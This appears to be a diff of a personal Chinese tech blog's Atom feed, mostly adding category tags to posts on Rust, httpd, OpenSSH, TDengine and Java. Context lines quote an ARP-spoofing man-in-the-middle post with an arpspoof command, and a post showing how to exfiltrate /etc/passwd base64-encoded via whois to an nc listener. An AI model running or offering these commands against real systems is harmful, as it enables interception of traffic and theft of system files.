@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://firsh.me/feed.xml" rel="self" type="application/atom+xml" /><link href="https://firsh.me/" rel="alternate" type="text/html" /><updated>2020-05-08T18:28:40+08:00</updated><id>https://firsh.me/feed.xml</id><title type="html">firshme</title><subtitle>张建新个人博客,我没有生来天赋过人,只有对技术的虔诚。</subtitle><author><name>ZhangJianXin</name></author><entry><title type="html">Time Machine Backup Fix ERROR</title><link href="https://firsh.me/2020/05/08/time-machine-by-s3-and-usb/" rel="alternate" type="text/html" title="Time Machine Backup Fix ERROR" /><published>2020-05-08T17:49:27+08:00</published><updated>2020-05-08T17:49:27+08:00</updated><id>https://firsh.me/2020/05/08/time-machine-by-s3-and-usb</id><content type="html" xml:base="https://firsh.me/2020/05/08/time-machine-by-s3-and-usb/">&lt;h3 id=&quot;介绍背景&quot;&gt;介绍背景&lt;/h3&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://firsh.me/feed.xml" rel="self" type="application/atom+xml" /><link href="https://firsh.me/" rel="alternate" type="text/html" /><updated>2021-02-09T16:59:25+08:00</updated><id>https://firsh.me/feed.xml</id><title type="html">下水鱼</title><subtitle>张建新个人博客,我没有生来天赋过人,只有对技术的虔诚。</subtitle><author><name>ZhangJianXin</name></author><entry><title type="html">Time Machine Backup Fix ERROR</title><link href="https://firsh.me/2020/05/08/time-machine-by-s3-and-usb/" rel="alternate" type="text/html" title="Time Machine Backup Fix ERROR" /><published>2020-05-08T17:49:27+08:00</published><updated>2020-05-08T17:49:27+08:00</updated><id>https://firsh.me/2020/05/08/time-machine-by-s3-and-usb</id><content type="html" xml:base="https://firsh.me/2020/05/08/time-machine-by-s3-and-usb/">&lt;h3 id=&quot;介绍背景&quot;&gt;介绍背景&lt;/h3&gt;
 
 &lt;ul&gt;
   &lt;li&gt;
@@ -60,7 +60,7 @@
   &lt;li&gt;以上的方法 适用与移动硬盘直接格式化后TimeMachine 无法备份，可以 用这个办法试试，将移动硬盘当作S3即可。&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">介绍背景</summary></entry><entry><title type="html">Apache Httpd 2.4.43 Install</title><link href="https://firsh.me/2020/04/03/apache-httpd-latest-onekey/" rel="alternate" type="text/html" title="Apache Httpd 2.4.43 Install" /><published>2020-04-03T16:10:24+08:00</published><updated>2020-04-03T16:10:24+08:00</updated><id>https://firsh.me/2020/04/03/apache-httpd-latest-onekey</id><content type="html" xml:base="https://firsh.me/2020/04/03/apache-httpd-latest-onekey/">&lt;p&gt;安装httpd 过程记录。&lt;/p&gt;
+&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><category term="macos" /><summary type="html">介绍背景</summary></entry><entry><title type="html">Apache Httpd 2.4.43 Install</title><link href="https://firsh.me/2020/04/03/apache-httpd-latest-onekey/" rel="alternate" type="text/html" title="Apache Httpd 2.4.43 Install" /><published>2020-04-03T16:10:24+08:00</published><updated>2020-04-03T16:10:24+08:00</updated><id>https://firsh.me/2020/04/03/apache-httpd-latest-onekey</id><content type="html" xml:base="https://firsh.me/2020/04/03/apache-httpd-latest-onekey/">&lt;p&gt;安装httpd 过程记录。&lt;/p&gt;
 
 &lt;h3 id=&quot;准备&quot;&gt;准备&lt;/h3&gt;
 
@@ -117,7 +117,7 @@ make &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; make &lt;sp
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">安装httpd 过程记录。</summary></entry><entry><title type="html">Rust 第一个入门程序</title><link href="https://firsh.me/2020/03/23/rust-get-startd-01/" rel="alternate" type="text/html" title="Rust 第一个入门程序" /><published>2020-03-23T00:35:55+08:00</published><updated>2020-03-23T00:35:55+08:00</updated><id>https://firsh.me/2020/03/23/rust-get-startd-01</id><content type="html" xml:base="https://firsh.me/2020/03/23/rust-get-startd-01/">&lt;p&gt;记录第一个rust 程序，以及对用到的工具rust语言特性的介绍。&lt;/p&gt;
+&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><category term="httpd" /><category term="apache" /><summary type="html">安装httpd 过程记录。</summary></entry><entry><title type="html">Rust 第一个入门程序</title><link href="https://firsh.me/2020/03/23/rust-get-startd-01/" rel="alternate" type="text/html" title="Rust 第一个入门程序" /><published>2020-03-23T00:35:55+08:00</published><updated>2020-03-23T00:35:55+08:00</updated><id>https://firsh.me/2020/03/23/rust-get-startd-01</id><content type="html" xml:base="https://firsh.me/2020/03/23/rust-get-startd-01/">&lt;p&gt;记录第一个rust 程序，以及对用到的工具rust语言特性的介绍。&lt;/p&gt;
 
 &lt;h3 id=&quot;rust-官方文档&quot;&gt;Rust 官方文档&lt;/h3&gt;
 
@@ -466,7 +466,7 @@ make &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; make &lt;sp
     &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
     &lt;span class=&quot;nf&quot;&gt;.bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1:8088&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;
     &lt;span class=&quot;nf&quot;&gt;.run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-    &lt;span class=&quot;py&quot;&gt;.await&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;.await&lt;/span&gt;
 &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -504,7 +504,7 @@ make &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; make &lt;sp
   &lt;li&gt;文章不定时更新，遇到自己觉得有意思的问题 第一时间更新上来。&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">记录第一个rust 程序，以及对用到的工具rust语言特性的介绍。</summary></entry><entry><title type="html">TDengine在量化交易中提供数据分析[更新中]。</title><link href="https://firsh.me/2020/02/24/associate-with-tdengine-and-start-the-eve-of-quantitative-trading/" rel="alternate" type="text/html" title="TDengine在量化交易中提供数据分析[更新中]。" /><published>2020-02-24T21:18:30+08:00</published><updated>2020-02-24T21:18:30+08:00</updated><id>https://firsh.me/2020/02/24/associate-with-tdengine-and-start-the-eve-of-quantitative-trading</id><content type="html" xml:base="https://firsh.me/2020/02/24/associate-with-tdengine-and-start-the-eve-of-quantitative-trading/">&lt;h3 id=&quot;记录一下量化交易的开始&quot;&gt;记录一下量化交易的开始&lt;/h3&gt;
+&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><category term="Rust" /><summary type="html">记录第一个rust 程序，以及对用到的工具rust语言特性的介绍。</summary></entry><entry><title type="html">TDengine在量化交易中提供数据分析[更新中]。</title><link href="https://firsh.me/2020/02/24/associate-with-tdengine-and-start-the-eve-of-quantitative-trading/" rel="alternate" type="text/html" title="TDengine在量化交易中提供数据分析[更新中]。" /><published>2020-02-24T21:18:30+08:00</published><updated>2020-02-24T21:18:30+08:00</updated><id>https://firsh.me/2020/02/24/associate-with-tdengine-and-start-the-eve-of-quantitative-trading</id><content type="html" xml:base="https://firsh.me/2020/02/24/associate-with-tdengine-and-start-the-eve-of-quantitative-trading/">&lt;h3 id=&quot;记录一下量化交易的开始&quot;&gt;记录一下量化交易的开始&lt;/h3&gt;
 
 &lt;h3 id=&quot;准备工具&quot;&gt;准备工具&lt;/h3&gt;
 
@@ -778,7 +778,7 @@ logDir                /data/log
 
 &lt;h3 id=&quot;纠正模型&quot;&gt;纠正模型&lt;/h3&gt;
 
-&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">记录一下量化交易的开始</summary></entry><entry><title type="html">CentOS6 下升级默认的OpenSSH操作记录（升级到OpenSSH_8.1p1)</title><link href="https://firsh.me/2019/12/30/centos-update-openssh-to-8.1/" rel="alternate" type="text/html" title="CentOS6 下升级默认的OpenSSH操作记录（升级到OpenSSH_8.1p1)" /><published>2019-12-30T17:46:12+08:00</published><updated>2019-12-30T17:46:12+08:00</updated><id>https://firsh.me/2019/12/30/centos-update-openssh-to-8.1</id><content type="html" xml:base="https://firsh.me/2019/12/30/centos-update-openssh-to-8.1/">&lt;p&gt;升级当前机器的openssh 到最新版本来规避漏洞导致服务器收到攻击。&lt;/p&gt;
+&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><category term="TDengine" /><summary type="html">记录一下量化交易的开始</summary></entry><entry><title type="html">CentOS6 下升级默认的OpenSSH操作记录（升级到OpenSSH_8.1p1)</title><link href="https://firsh.me/2019/12/30/centos-update-openssh-to-8.1/" rel="alternate" type="text/html" title="CentOS6 下升级默认的OpenSSH操作记录（升级到OpenSSH_8.1p1)" /><published>2019-12-30T17:46:12+08:00</published><updated>2019-12-30T17:46:12+08:00</updated><id>https://firsh.me/2019/12/30/centos-update-openssh-to-8.1</id><content type="html" xml:base="https://firsh.me/2019/12/30/centos-update-openssh-to-8.1/">&lt;p&gt;升级当前机器的openssh 到最新版本来规避漏洞导致服务器收到攻击。&lt;/p&gt;
 
 &lt;h3 id=&quot;准备和检查&quot;&gt;准备和检查&lt;/h3&gt;
 
@@ -903,7 +903,7 @@ Starting sshd:                                             &lt;span class=&quot;
 OpenSSH_7.6p1, OpenSSL 1.0.1e-fips 11 Feb 2013
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">升级当前机器的openssh 到最新版本来规避漏洞导致服务器收到攻击。</summary></entry><entry><title type="html">Rust Native Spark Sample Install</title><link href="https://firsh.me/2019/12/26/native_spark-study1/" rel="alternate" type="text/html" title="Rust Native Spark Sample Install" /><published>2019-12-26T10:34:51+08:00</published><updated>2019-12-26T10:34:51+08:00</updated><id>https://firsh.me/2019/12/26/native_spark-study1</id><content type="html" xml:base="https://firsh.me/2019/12/26/native_spark-study1/">&lt;p&gt;本文简单介绍Rust版本的Spark 安装 以及dev版本的测试。&lt;/p&gt;
+&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><category term="linux" /><summary type="html">升级当前机器的openssh 到最新版本来规避漏洞导致服务器收到攻击。</summary></entry><entry><title type="html">Rust Native Spark Sample Install</title><link href="https://firsh.me/2019/12/26/native_spark-study1/" rel="alternate" type="text/html" title="Rust Native Spark Sample Install" /><published>2019-12-26T10:34:51+08:00</published><updated>2019-12-26T10:34:51+08:00</updated><id>https://firsh.me/2019/12/26/native_spark-study1</id><content type="html" xml:base="https://firsh.me/2019/12/26/native_spark-study1/">&lt;p&gt;本文简单介绍Rust版本的Spark 安装 以及dev版本的测试。&lt;/p&gt;
 
 &lt;h3 id=&quot;介绍-native-spark-for-rust&quot;&gt;介绍 Native Spark For Rust&lt;/h3&gt;
 
@@ -990,7 +990,7 @@ cargo run &lt;span class=&quot;nt&quot;&gt;--example&lt;/span&gt; make_rdd
 
 &lt;h4 id=&quot;未完结&quot;&gt;未完结&lt;/h4&gt;
 
-&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">本文简单介绍Rust版本的Spark 安装 以及dev版本的测试。</summary></entry><entry><title type="html">Arp 欺骗获取设备信息</title><link href="https://firsh.me/2019/09/05/arp-dniff-url-sslniff/" rel="alternate" type="text/html" title="Arp 欺骗获取设备信息" /><published>2019-09-05T17:00:57+08:00</published><updated>2019-09-05T17:00:57+08:00</updated><id>https://firsh.me/2019/09/05/arp-dniff-url-sslniff</id><content type="html" xml:base="https://firsh.me/2019/09/05/arp-dniff-url-sslniff/">&lt;p&gt;家庭路由器中间人攻击以及数据获取。&lt;/p&gt;
+&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><category term="spark" /><summary type="html">本文简单介绍Rust版本的Spark 安装 以及dev版本的测试。</summary></entry><entry><title type="html">Arp 欺骗获取设备信息</title><link href="https://firsh.me/2019/09/05/arp-dniff-url-sslniff/" rel="alternate" type="text/html" title="Arp 欺骗获取设备信息" /><published>2019-09-05T17:00:57+08:00</published><updated>2019-09-05T17:00:57+08:00</updated><id>https://firsh.me/2019/09/05/arp-dniff-url-sslniff</id><content type="html" xml:base="https://firsh.me/2019/09/05/arp-dniff-url-sslniff/">&lt;p&gt;家庭路由器中间人攻击以及数据获取。&lt;/p&gt;
 
 &lt;h2 id=&quot;arp过程介绍&quot;&gt;Arp过程介绍&lt;/h2&gt;
 
@@ -1055,13 +1055,13 @@ arpspoof &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; en0 &lt;span class=&qu
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip.src&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;192.168.2.213 and http
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">家庭路由器中间人攻击以及数据获取。</summary></entry><entry><title type="html">利用Whois传输小文件。</title><link href="https://firsh.me/2019/09/02/use-whois-send-file-hack/" rel="alternate" type="text/html" title="利用Whois传输小文件。" /><published>2019-09-02T10:03:13+08:00</published><updated>2019-09-02T10:03:13+08:00</updated><id>https://firsh.me/2019/09/02/use-whois-send-file-hack</id><content type="html" xml:base="https://firsh.me/2019/09/02/use-whois-send-file-hack/">&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;传输机：
+&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><category term="ctf" /><summary type="html">家庭路由器中间人攻击以及数据获取。</summary></entry><entry><title type="html">利用Whois传输小文件。</title><link href="https://firsh.me/2019/09/02/use-whois-send-file-hack/" rel="alternate" type="text/html" title="利用Whois传输小文件。" /><published>2019-09-02T10:03:13+08:00</published><updated>2019-09-02T10:03:13+08:00</updated><id>https://firsh.me/2019/09/02/use-whois-send-file-hack</id><content type="html" xml:base="https://firsh.me/2019/09/02/use-whois-send-file-hack/">&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;传输机：
 root@john:~# whois &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 127.0.0.1 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4444 &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/passwd | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
 接受机：
 root@john:/tmp# nc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 4444 | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s/ //g&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">传输机： root@john:~# whois -h 127.0.0.1 -p 4444 `cat /etc/passwd | base64` 接受机： root@john:/tmp# nc -l -v -p 4444 | sed &quot;s/ //g&quot; | base64 -d</summary></entry><entry><title type="html">Java实现DirectIo文件方式操作文件系统</title><link href="https://firsh.me/2019/08/07/linux-directio-java/" rel="alternate" type="text/html" title="Java实现DirectIo文件方式操作文件系统" /><published>2019-08-07T09:41:11+08:00</published><updated>2019-08-07T09:41:11+08:00</updated><id>https://firsh.me/2019/08/07/linux-directio-java</id><content type="html" xml:base="https://firsh.me/2019/08/07/linux-directio-java/">&lt;h2 id=&quot;场景&quot;&gt;场景&lt;/h2&gt;
+&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><category term="CTF" /><summary type="html">传输机： root@john:~# whois -h 127.0.0.1 -p 4444 `cat /etc/passwd | base64` 接受机： root@john:/tmp# nc -l -v -p 4444 | sed &quot;s/ //g&quot; | base64 -d</summary></entry><entry><title type="html">Java实现DirectIo文件方式操作文件系统</title><link href="https://firsh.me/2019/08/07/linux-directio-java/" rel="alternate" type="text/html" title="Java实现DirectIo文件方式操作文件系统" /><published>2019-08-07T09:41:11+08:00</published><updated>2019-08-07T09:41:11+08:00</updated><id>https://firsh.me/2019/08/07/linux-directio-java</id><content type="html" xml:base="https://firsh.me/2019/08/07/linux-directio-java/">&lt;h2 id=&quot;场景&quot;&gt;场景&lt;/h2&gt;
 &lt;ul&gt;
   &lt;li&gt;APIServer接口要求较高的并发，而且还要将数据文件存储到本地备份，在低消耗内存CPU情况下提高程序的运行速度以及稳定性。&lt;/li&gt;
   &lt;li&gt;相关文章 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://man7.org/linux/man-pages/man2/open.2.html&lt;/code&gt;&lt;/li&gt;
@@ -1094,7 +1094,7 @@ root@john:/tmp# nc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span cla
    See the License for the specific language governing permissions and
    limitations under the License.
  */&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;huadi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;utils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;directio&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.huadi.utils.directio.io&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
 
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.IOException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.OutputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
@@ -1213,7 +1213,7 @@ root@john:/tmp# nc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span cla
    See the License for the specific language governing permissions and
    limitations under the License.
  */&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;huadi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;utils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;directio&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.huadi.utils.directio.io&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
 
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.util.Random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
@@ -1308,7 +1308,7 @@ root@john:/tmp# nc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span cla
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">场景 APIServer接口要求较高的并发，而且还要将数据文件存储到本地备份，在低消耗内存CPU情况下提高程序的运行速度以及稳定性。 相关文章 http://man7.org/linux/man-pages/man2/open.2.html 实现思路 调用Linux本身的接口 Java采用JNA实现</summary></entry><entry><title type="html">读取数据发送到MQ</title><link href="https://firsh.me/2019/08/03/file_to_rocketmq_middleware/" rel="alternate" type="text/html" title="读取数据发送到MQ" /><published>2019-08-03T14:01:12+08:00</published><updated>2019-08-03T14:01:12+08:00</updated><id>https://firsh.me/2019/08/03/file_to_rocketmq_middleware</id><content type="html" xml:base="https://firsh.me/2019/08/03/file_to_rocketmq_middleware/">&lt;p&gt;数据通过FTP上传到服务器要求将数据发送到RocketMQ原版本用Java写的（不是本人）TPS上不去资源消耗大等问题。&lt;/p&gt;
+&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><category term="Java" /><category term="Linux" /><category term="Directio" /><summary type="html">场景 APIServer接口要求较高的并发，而且还要将数据文件存储到本地备份，在低消耗内存CPU情况下提高程序的运行速度以及稳定性。 相关文章 http://man7.org/linux/man-pages/man2/open.2.html 实现思路 调用Linux本身的接口 Java采用JNA实现</summary></entry><entry><title type="html">读取数据发送到MQ</title><link href="https://firsh.me/2019/08/03/file_to_rocketmq_middleware/" rel="alternate" type="text/html" title="读取数据发送到MQ" /><published>2019-08-03T14:01:12+08:00</published><updated>2019-08-03T14:01:12+08:00</updated><id>https://firsh.me/2019/08/03/file_to_rocketmq_middleware</id><content type="html" xml:base="https://firsh.me/2019/08/03/file_to_rocketmq_middleware/">&lt;p&gt;数据通过FTP上传到服务器要求将数据发送到RocketMQ原版本用Java写的（不是本人）TPS上不去资源消耗大等问题。&lt;/p&gt;
 
 &lt;h2 id=&quot;缘由&quot;&gt;缘由&lt;/h2&gt;
 
@@ -1509,4 +1509,4 @@ root@john:/tmp# nc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span cla
 `&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><summary type="html">数据通过FTP上传到服务器要求将数据发送到RocketMQ原版本用Java写的（不是本人）TPS上不去资源消耗大等问题。</summary></entry></feed>
+&lt;p&gt;转载请注明出处，本文采用 &lt;a href=&quot;http://creativecommons.org/licenses/by-nc-nd/4.0/&quot;&gt;CC4.0&lt;/a&gt; 协议授权&lt;/p&gt;</content><author><name>ZhangJianXin</name></author><category term="rocketmq" /><category term="golang" /><summary type="html">数据通过FTP上传到服务器要求将数据发送到RocketMQ原版本用Java写的（不是本人）TPS上不去资源消耗大等问题。</summary></entry></feed>
